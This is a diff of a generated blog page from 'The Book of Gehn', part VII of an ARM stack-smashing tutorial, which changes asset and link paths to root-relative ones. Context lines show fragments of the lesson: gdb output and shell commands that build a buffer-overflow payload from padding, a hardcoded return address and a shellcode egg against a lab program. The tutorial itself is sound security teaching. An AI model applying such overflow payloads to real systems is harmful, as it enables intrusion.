@@ -47,24 +47,24 @@
       <script src="https://d3js.org/d3.v4.min.js"></script>
     
 
-    <script src='/book-of-gehn/js/venn/venn.min.js'></script>
-    <script src='/book-of-gehn/js/venn/helper.js'></script>
+    <script src='/js/venn/venn.min.js'></script>
+    <script src='/js/venn/helper.js'></script>
 
-    <script src='/book-of-gehn/js/fix_syntax_highlight.js'></script>
-  <link rel="stylesheet" type="text/css" href="/book-of-gehn/css/tufte.css">
-  <link rel="stylesheet" type="text/css" href="/book-of-gehn/css/latex.css">
+    <script src='/js/fix_syntax_highlight.js'></script>
+  <link rel="stylesheet" type="text/css" href="/css/tufte.css">
+  <link rel="stylesheet" type="text/css" href="/css/latex.css">
 
-  <link rel="canonical" href="/book-of-gehn/articles/2021/02/04/Smashing-ARM-Stack-for-Fun-Part-VII.html">
+  <link rel="canonical" href="/articles/2021/02/04/Smashing-ARM-Stack-for-Fun-Part-VII.html">
 
-  <link rel="stylesheet" type="text/css" href="/book-of-gehn/css/all.min.css">
+  <link rel="stylesheet" type="text/css" href="/css/all.min.css">
 
-  <link type="application/atom+xml" rel="alternate" href="/book-of-gehn/feed.xml" title="The Book of Gehn" />
+  <link type="application/atom+xml" rel="alternate" href="/feed.xml" title="The Book of Gehn" />
 </head>
 
   <body>
     <header>
 	
-		<h1 class="header-title"><a href="/book-of-gehn/">The Book of Gehn</a></h1>
+		<h1 class="header-title"><a href="//">The Book of Gehn</a></h1>
 		
 		
 	
@@ -165,7 +165,7 @@ writing the <em>ret</em> address: 0x4 more bytes and we are done.</p>
    <span class="mh">0x10508</span> <span class="o">&lt;</span><span class="n">getpath</span><span class="o">+</span><span class="mi">48</span><span class="o">&gt;</span>     <span class="n">bl</span>     <span class="err">#</span><span class="n">gets</span><span class="err">@</span><span class="n">plt</span> <span class="o">&lt;</span><span class="n">gets</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>
 </code></pre></div></div>
 
-<figure><figcaption><span></span></figcaption><object align="middle" data="/book-of-gehn/uml/665e22a8428ba6e2aa2f8675a62f328f1c7ac9aa.svg" type="image/svg+xml"></object></figure>
+<figure><figcaption><span></span></figcaption><object align="middle" data="/uml/665e22a8428ba6e2aa2f8675a62f328f1c7ac9aa.svg" type="image/svg+xml"></object></figure>
 
 <p>The stack pointer <code class="highlighter-rouge">sp</code> after <code class="highlighter-rouge">getpath</code>
 returns will be at <em>4 bytes more</em>  than <code class="highlighter-rouge">fp</code> <em>before</em> the return:</p>
@@ -178,12 +178,12 @@ returns will be at <em>4 bytes more</em>  than <code class="highlighter-rouge">f
 <span class="err">#</span><span class="mi">1</span>  <span class="mh">0x00010578</span> <span class="k">in</span> <span class="n">main</span> <span class="p">()</span>
 </code></pre></div></div>
 
-<figure><figcaption><span></span></figcaption><object align="middle" data="/book-of-gehn/uml/a512ceab1c386ea1b5bfb6ac21a476f21c7ac9aa.svg" type="image/svg+xml"></object></figure>
+<figure><figcaption><span></span></figcaption><object align="middle" data="/uml/a512ceab1c386ea1b5bfb6ac21a476f21c7ac9aa.svg" type="image/svg+xml"></object></figure>
 
 <h2 id="the-attack-without-dep-and-aslr">The attack (without DEP and ASLR)</h2>
 
 <p>The <code class="highlighter-rouge">egg.text</code> is the same one used in the
-<a href="/book-of-gehn/articles/2021/01/26/Smashing-ARM-Stack-for-Fun-Part-VI.html">part 6</a>.</p>
+<a href="/articles/2021/01/26/Smashing-ARM-Stack-for-Fun-Part-VI.html">part 6</a>.</p>
 
 <div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pi@raspberrypi:~<span class="nv">$ </span><span class="nb">echo</span> <span class="nt">-ne</span> <span class="s1">'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x88\xfb\xff\xbe'</span> <span class="o">&gt;</span> exploit
 pi@raspberrypi:~<span class="nv">$ </span><span class="nb">cat </span>egg.text <span class="o">&gt;&gt;</span> exploit
@@ -209,7 +209,7 @@ pwn!
 <p>However there are a lot of things to explore, tweak and stretch.</p>
 
 <p>In the
-<a href="/book-of-gehn/articles/2021/01/26/Smashing-ARM-Stack-for-Fun-Part-VI.html">part 6</a>
+<a href="/articles/2021/01/26/Smashing-ARM-Stack-for-Fun-Part-VI.html">part 6</a>
 I coded a ARM egg, the next obvious step would be write the same egg in
 Thumb mode.</p>
 
@@ -218,7 +218,7 @@ these modern days, the stack is <strong>not</strong> executable so it would be c
 to learn how to bypass this restriction (known as Data Execution
 Prevention <em>DEP</em> or Write-xor-Execute <em>W+E</em>).</p>
 
-<p>Since <a href="/book-of-gehn/articles/2021/01/20/Smashing-ARM-Stack-for-Fun-Part-V.html">part 5</a>
+<p>Since <a href="/articles/2021/01/20/Smashing-ARM-Stack-for-Fun-Part-V.html">part 5</a>
 we were <em>hardcoding</em> addresses. <em>Shame on me</em>.</p>
 
 <p>Address Space Layout Randomization <em>(ASLR)</em> is a well established feature
@@ -237,7 +237,7 @@ topic to learn.</p>
             
             Gehn
         </span></br>
-            <a style="text-decoration: none;" href="/book-of-gehn/feed.xml"><img height="16px" width="16px" src="/book-of-gehn/assets/blog-assets/rss-32px.png" /></a>
+            <a style="text-decoration: none;" href="/feed.xml"><img height="16px" width="16px" src="/assets/blog-assets/rss-32px.png" /></a>
         <br>
         
 
